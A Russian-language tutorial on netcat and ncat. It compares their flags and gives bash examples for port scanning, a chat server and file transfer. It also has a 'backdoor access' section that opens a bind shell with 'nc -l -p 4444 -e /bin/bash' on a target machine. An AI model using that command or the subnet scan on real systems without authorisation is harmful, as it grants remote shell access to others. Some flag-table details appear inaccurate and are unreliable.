

Netcat (nc) — это универсальный инструмент для работы с сетевыми соединениями, который поддерживает как TCP, так и UDP протоколы. Рассмотрим его возможности подробно с примерами.

### Сравнение ключей `nc` (netcat) и `ncat`

| Ключ               | `nc` (netcat) | `ncat` | Описание                           |
|--------------------|---------------|--------|------------------------------------|
| **Основные**       |
| `-4`               | ✅             | ✅      | Принудительный IPv4                |
| `-6`               | ✅             | ✅      | Принудительный IPv6                |
| `-u`               | ✅             | ✅      | UDP режим                          |
| `-v`               | ✅             | ✅      | Подробный вывод                    |
| `-w`               | ✅             | ✅      | Таймаут соединения                 |
| `-z`               | ✅             | ✅      | Сканирование портов                |
| **Серверные**      |
| `-l`               | ✅             | ✅      | Режим прослушивания                |
| `-p`               | ✅             | ✅      | Указание порта                     |
| `-k`               | ❌             | ✅      | Поддержка множественных соединений |
| **Безопасность**   |
| `--ssl`            | ❌             | ✅      | SSL шифрование                     |
| `--ssl-verify`     | ❌             | ✅      | Проверка SSL сертификата           |
| `--proxy`          | ❌             | ✅      | Поддержка прокси                   |
| `--proxy-type`     | ❌             | ✅      | Тип прокси (HTTP/SOCKS)            |
| **Дополнительные** |
| `-c`               | ❌             | ✅      | Выполнить команду при подключении  |
| `-m`               | ❌             | ✅      | Максимальное число соединений      |
| `--allow`          | ❌             | ✅      | Разрешить только указанные хосты   |
| `--broker`         | ❌             | ✅      | Режим брокера соединений           |
| **Протоколы**      |
| `--sctp`           | ❌             | ✅      | Поддержка SCTP                     |
| `--crlf`           | ❌             | ✅      | Автоматическое преобразование CRLF |

### Сканирование портов
```bash
nc -zv example.com 20-80
for ip in {1..254}; do nc -zv -w 1 192.168.1.$ip 80 2>&1 | grep succeeded; done
```

### Создание чат-сервера
```bash
# На сервере
nc -l -p 1234 -v
# На клиенте
nc server_ip 1234 -v
```

### Передача файла
```bash
# На отправителе
nc -l -p 1234 < file.txt
# На получателе
nc server_ip 1234 > received_file.txt
```

### Создание бекдор-доступа
```bash
# На целевой машине
nc -l -p 4444 -e /bin/bash
# На атакующей машине
nc target_ip 4444
```

### Сравнение `nc` (netcat) и `ncat` (улучшенная версия)

| Характеристика               | `nc` (классический netcat)       | `ncat` (из Nmap)                  |
|------------------------------|----------------------------------|-----------------------------------|
| **Происхождение**            | Классическая версия             | Разработан Nmap Project           |
| **Шифрование**               | ❌ Нет                          | ✅ SSL/TLS, SSH                   |
| **IPv6**                     | ✅ Да (не во всех версиях)       | ✅ Полная поддержка               |
| **Прокси**                   | ❌ Нет                          | ✅ HTTP/SOCKS4/5                  |
| **Перенаправление портов**   | ❌ Ограничено                   | ✅ Гибкие варианты                |
| **Мультисоединения**         | ❌ Нет                          | ✅ Поддержка `-k` (удержание)     |
| **Чтение/запись из stdin**   | ✅ Да                           | ✅ Улучшенная обработка           |
| **Таймауты**                 | ✅ Базовые                      | ✅ Расширенные настройки          |
| **Поддержка SCTP**           | ❌ Нет                          | ✅ Да                             |
| **Документация**             | ❌ Разрозненная                 | ✅ Полная (man ncat)              |
| **Установка**                | Встроен в большинство ОС        | Требует установки Nmap           |